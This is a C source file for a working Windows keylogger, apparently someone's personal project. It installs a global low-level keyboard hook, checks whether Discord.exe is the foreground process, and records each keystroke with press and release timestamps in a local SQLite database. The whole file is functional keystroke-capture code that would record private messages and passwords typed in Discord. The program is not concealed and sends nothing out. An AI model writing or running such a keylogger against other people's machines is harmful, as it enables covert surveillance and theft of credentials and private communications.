#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "sqlite3.h"

#ifdef _WIN32
#include <windows.h>
#include <psapi.h>  // For GetModuleFileNameEx
#pragma comment(lib, "psapi.lib")  // Link with psapi.lib
#endif

// Database path - adjust this to match your project structure
#define DB_PATH "C:/Users/Ben/CLionProjects/SaveInput/KeyLogger/data/database.db"

// SQLite database connection
sqlite3 *db = NULL;

// Function prototypes
int init_database();
int log_key_press(const char *key, double press_time, double release_time);
void cleanup_database();
int insert_key_press(const char *key, double press_time);
int update_key_release(const char *key, double release_time);
#ifdef _WIN32
// Windows-specific keyboard hook
HHOOK keyboard_hook;
double get_high_precision_time();
char* get_active_window_name();

// Keyboard event handler for Windows
LRESULT CALLBACK keyboard_proc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        KBDLLHOOKSTRUCT *kbStruct = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = kbStruct->vkCode;

        char* window_name = get_active_window_name();
        if (window_name && strcmp(window_name, "Discord.exe") == 0) {
            char key_name[32] = {0};

            // Resolve key name only once
            BYTE keyboard_state[256] = {0};
            GetKeyboardState(keyboard_state);
            WORD character = 0;

            if (ToAscii(vkCode, kbStruct->scanCode, keyboard_state, &character, 0) == 1) {
                sprintf(key_name, "%c", (char)character);
            } else {
                switch (vkCode) {
                    case VK_RETURN: strcpy(key_name, "Key.enter"); break;
                    case VK_SPACE: strcpy(key_name, "Key.space"); break;
                    case VK_BACK: strcpy(key_name, "Key.backspace"); break;
                    case VK_TAB: strcpy(key_name, "Key.tab"); break;
                    case VK_SHIFT:
                    case VK_LSHIFT:
                    case VK_RSHIFT: strcpy(key_name, "Key.shift"); break;
                    case VK_CONTROL:
                    case VK_LCONTROL: strcpy(key_name, "Key.ctrl_l"); break;
                    case VK_MENU:
                    case VK_LMENU: strcpy(key_name, "Key.alt_l"); break;
                    case VK_ESCAPE: strcpy(key_name, "Key.esc"); break;
                    default: sprintf(key_name, "Key.%d", vkCode);
                }
            }

            // Handle key press
            if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
                double press_time = get_high_precision_time();
                insert_key_press(key_name, press_time);
            }

            // Handle key release
            else if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {
                double release_time = get_high_precision_time();
                update_key_release(key_name, release_time);
            }
        }

        free(window_name);
    }

    return CallNextHookEx(keyboard_hook, nCode, wParam, lParam);
}


// Get active window executable name
char* get_active_window_name() {
    char* window_name = malloc(256);
    if (!window_name) return NULL;

    HWND foreground = GetForegroundWindow();
    if (!foreground) {
        free(window_name);
        return NULL;
    }

    DWORD process_id;
    GetWindowThreadProcessId(foreground, &process_id);

    HANDLE process = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, process_id);
    if (!process) {
        free(window_name);
        return NULL;
    }

    if (!GetModuleFileNameExA(process, NULL, window_name, 256)) {
        free(window_name);
        CloseHandle(process);
        return NULL;
    }

    CloseHandle(process);

    // Extract just the executable name from the path
    char* filename = strrchr(window_name, '\\');
    if (filename) {
        char* temp = _strdup(filename + 1);
        free(window_name);
        window_name = temp;
    }

    return window_name;
}

// Get current time with microsecond precision (matches Python's time.perf_counter())
double get_high_precision_time() {
    LARGE_INTEGER frequency, counter;
    QueryPerformanceFrequency(&frequency);
    QueryPerformanceCounter(&counter);
    // Returns time in seconds with microsecond precision (same as Python's time.perf_counter())
    return (double)counter.QuadPart / (double)frequency.QuadPart;
}
#endif

// Initialize the SQLite database
int init_database() {
    int rc = sqlite3_open(DB_PATH, &db);

    if (rc != SQLITE_OK) {
        fprintf(stderr, "Cannot open database: %s\n", sqlite3_errmsg(db));
        sqlite3_close(db);
        return -1;
    }

    // Create table if it doesn't exist
    const char *sql = "CREATE TABLE IF NOT EXISTS messages ("
                     "press_time REAL, "
                     "release_time REAL, "
                     "message TEXT)";

    char *err_msg = NULL;
    rc = sqlite3_exec(db, sql, 0, 0, &err_msg);

    if (rc != SQLITE_OK) {
        fprintf(stderr, "SQL error: %s\n", err_msg);
        sqlite3_free(err_msg);
        return -1;
    }

    printf("Database initialized successfully.\n");
    return 0;
}

// Log a key press to the database
int insert_key_press(const char *key, double press_time) {
    if (!db) return -1;

    sqlite3_stmt *stmt;
    const char *sql = "INSERT INTO messages (press_time, release_time, message) VALUES (?, NULL, ?)";

    int rc = sqlite3_prepare_v2(db, sql, -1, &stmt, NULL);
    if (rc != SQLITE_OK) {
        fprintf(stderr, "Insert prepare failed: %s\n", sqlite3_errmsg(db));
        return -1;
    }

    sqlite3_bind_double(stmt, 1, press_time);
    sqlite3_bind_text(stmt, 2, key, -1, SQLITE_STATIC);

    rc = sqlite3_step(stmt);
    if (rc != SQLITE_DONE) {
        fprintf(stderr, "Insert failed: %s\n", sqlite3_errmsg(db));
        sqlite3_finalize(stmt);
        return -1;
    }

    sqlite3_finalize(stmt);
    printf("Inserted key press: %s at %.3fs\n", key, press_time);
    return 0;
}
int update_key_release(const char *key, double release_time) {
    if (!db) return -1;

    sqlite3_stmt *stmt;

    // Correct SQL with subquery to get the most recent matching row
    const char *sql = "UPDATE messages SET release_time = ? "
                      "WHERE rowid = ("
                      "  SELECT rowid FROM messages "
                      "  WHERE message = ? AND release_time IS NULL "
                      "  ORDER BY press_time DESC LIMIT 1"
                      ")";
    printf("Inserted key release: %s at %.3fs\n", key, release_time);
    int rc = sqlite3_prepare_v2(db, sql, -1, &stmt, NULL);
    if (rc != SQLITE_OK) {
        fprintf(stderr, "Update prepare failed: %s\n", sqlite3_errmsg(db));
        return -1;
    }

    sqlite3_bind_double(stmt, 1, release_time);  // Bind release_time
    sqlite3_bind_text(stmt, 2, key, -1, SQLITE_STATIC);  // Bind key

    rc = sqlite3_step(stmt);
    if (rc != SQLITE_DONE) {
        fprintf(stderr, "Failed to update data: %s\n", sqlite3_errmsg(db));
        sqlite3_finalize(stmt);
        return -1;
    }

    sqlite3_finalize(stmt);
    return 0;
}
// Clean up database connection
void cleanup_database() {
    if (db) {
        sqlite3_close(db);
        printf("Database connection closed.\n");
    }
}

int main() {
    printf("C KeyLogger starting...\n");

    // Initialize database
    if (init_database() != 0) {
        fprintf(stderr, "Failed to initialize database. Exiting.\n");
        return 1;
    }

#ifdef _WIN32
    // Set up keyboard hook for Windows
    keyboard_hook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboard_proc, NULL, 0);

    if (!keyboard_hook) {
        fprintf(stderr, "Failed to set keyboard hook. Error code: %lu\n", GetLastError());
        cleanup_database();
        return 1;
    }

    printf("Keyboard hook installed. Capturing Discord keystrokes...\n");
    printf("Press Ctrl+C in this window to stop.\n");

    // Message loop to keep the program running
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Clean up
    UnhookWindowsHookEx(keyboard_hook);
#else
    // For non-Windows platforms, we would implement different keyboard hooks
    printf("Keyboard logging is currently only supported on Windows.\n");
#endif

    cleanup_database();
    return 0;
}